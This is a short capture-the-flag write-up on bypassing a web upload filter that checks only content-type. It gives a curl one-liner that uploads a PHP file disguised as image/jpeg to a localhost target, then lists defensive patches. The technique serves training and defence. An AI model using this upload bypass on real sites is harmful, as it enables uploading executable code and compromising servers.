# Tools

# Exploit

In this one, we try to exploit a breach in the upload. We notice that the web application firewall seems to check only the content-type.
It only seems to accept jpg, so we just have to send a malicious file with the content-type changed to image/jpeg.

```bash
echo '<?php echo "malware" ?>' > /tmp/malware.php && curl -X POST -F "Upload=Upload" -F "uploaded=@/tmp/malware.php;type=image/jpeg" "http://127.0.0.1:8080/index.php?page=upload" | grep 'The flag is :'
```

# Patch

1. Use Safe Storage Location: Store uploaded files outside the web root directory or configure the server to prevent execution of files in the upload directory.

2. Set Proper File Permissions: Set restrictive permissions on the upload directory (e.g., 0750).

3. Consider Using a CDN or Dedicated Image Service: For larger applications, consider using specialized services for handling user uploads.

4. Implement Image Processing: Reprocess all uploaded images to strip any embedded code.

5. Add Logging: Log all upload attempts, successful or not, for security monitoring